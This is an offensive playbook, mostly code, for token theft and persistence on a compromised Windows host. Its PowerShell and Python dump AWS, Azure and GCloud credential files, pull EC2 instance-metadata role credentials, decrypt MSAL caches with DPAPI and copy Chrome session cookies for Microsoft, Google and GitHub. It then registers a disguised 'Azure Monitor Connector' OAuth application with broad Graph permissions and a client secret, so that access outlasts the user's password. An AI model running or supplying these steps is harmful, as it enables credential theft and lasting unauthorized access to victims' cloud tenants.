# Token theft and identity persistence

Harvesting refresh tokens and session cookies from a compromised host and using them
to establish persistent access independent of the user's password.

## Locate token storage

On Windows, identify which cloud and SaaS services the user accesses:

```powershell
# check for cloud CLI credential files
$credPaths = @(
    "$env:USERPROFILE\.aws\credentials",
    "$env:USERPROFILE\.aws\config",
    "$env:USERPROFILE\.azure\accessTokens.json",
    "$env:USERPROFILE\.azure\msal_token_cache.json",
    "$env:APPDATA\gcloud\credentials.db",
    "$env:APPDATA\gcloud\access_tokens.db",
    "$env:LOCALAPPDATA\.IdentityService\msal.cache"
)
foreach ($p in $credPaths) {
    if (Test-Path $p) { Write-Output "Found: $p" }
}

# check Windows Credential Manager for web credentials
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | Select-Object Resource, UserName
```

## Extract AWS credentials

```powershell
# AWS CLI stores long-term credentials in plaintext
Get-Content "$env:USERPROFILE\.aws\credentials"

# EC2 instance metadata: temporary credentials for the attached IAM role
# accessible from any process on the instance without authentication
$meta = Invoke-WebRequest -Uri 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' -UseBasicParsing
$role = $meta.Content
$creds = Invoke-WebRequest -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role" -UseBasicParsing | ConvertFrom-Json

Write-Output "AccessKeyId: $($creds.AccessKeyId)"
Write-Output "SecretAccessKey: $($creds.SecretAccessKey)"
Write-Output "Token: $($creds.Token)"
Write-Output "Expiration: $($creds.Expiration)"
```

Instance metadata credentials expire but are automatically rotated. For persistent
access, use the temporary credentials to create a long-term IAM user or role.

## Extract Azure tokens

```powershell
# Azure CLI token cache (plaintext JSON on older versions)
Get-Content "$env:USERPROFILE\.azure\accessTokens.json" | ConvertFrom-Json |
  Select-Object tokenType, expiresOn, resource, accessToken, refreshToken

# MSAL cache (newer Azure CLI and Office apps): encrypted with DPAPI
# requires running as the same user; decrypt with:
Add-Type -AssemblyName System.Security
$encrypted = [System.IO.File]::ReadAllBytes("$env:LOCALAPPDATA\.IdentityService\msal.cache")
$decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encrypted, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Text.Encoding]::UTF8.GetString($decrypted)
```

## Extract browser session cookies

Browser session cookies for Microsoft 365, Google Workspace, and other SaaS platforms:

```python
import sqlite3, shutil, os, json

# Chrome cookies (copy first; browser locks the file)
src = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies')
dst = r'C:\Temp\cookies.db'
shutil.copy2(src, dst)

conn = sqlite3.connect(dst)
c = conn.cursor()
c.execute("""
    SELECT host_key, name, encrypted_value, expires_utc
    FROM cookies
    WHERE host_key LIKE '%.microsoft.com'
       OR host_key LIKE '%.google.com'
       OR host_key LIKE '%.github.com'
""")

import ctypes, ctypes.wintypes

for host, name, encrypted_value, expires in c.fetchall():
    # decrypt with DPAPI (same user context required)
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

    # (full DPAPI decrypt implementation via CryptUnprotectData)
    print(f"{host}: {name}")
```

## Establish OAuth application backdoor

Using the compromised user's token, create a persistent OAuth application:

```python
import requests

# using a Microsoft Graph access token
headers = {'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'}

# create a new application registration
app_data = {
    'displayName': 'Azure Monitor Connector',
    'signInAudience': 'AzureADMyOrg',
    'requiredResourceAccess': [{
        'resourceAppId': '00000003-0000-0000-c000-000000000000',  # Microsoft Graph
        'resourceAccess': [
            {'id': 'e1fe6dd8-ba31-4d61-89e7-88639da4683d', 'type': 'Scope'},  # User.Read
            {'id': '62a82d76-70ea-4822-8064-2eb4c9f59d40', 'type': 'Role'},   # Group.ReadWrite.All
        ]
    }]
}

r = requests.post('https://graph.microsoft.com/v1.0/applications', headers=headers, json=app_data)
app_id = r.json()['appId']
obj_id = r.json()['id']

# add a client secret
secret_data = {'passwordCredential': {'displayName': 'sync-key', 'endDateTime': '2027-01-01T00:00:00Z'}}
r = requests.post(f'https://graph.microsoft.com/v1.0/applications/{obj_id}/addPassword',
                  headers=headers, json=secret_data)
client_secret = r.json()['secretText']

print(f'App ID: {app_id}')
print(f'Client Secret: {client_secret}')
# use these for persistent access independent of the compromised user
```

## Verify and maintain access

```python
# test the OAuth app credentials
r = requests.post(
    f'https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token',
    data={
        'client_id': app_id,
        'client_secret': client_secret,
        'grant_type': 'client_credentials',
        'scope': 'https://graph.microsoft.com/.default'
    }
)
token = r.json().get('access_token')
if token:
    print('Persistent access confirmed')
```

Monitor the application registration's expiry date. Client secrets expire; schedule
rotation before expiry (or set the maximum allowed lifetime at creation).
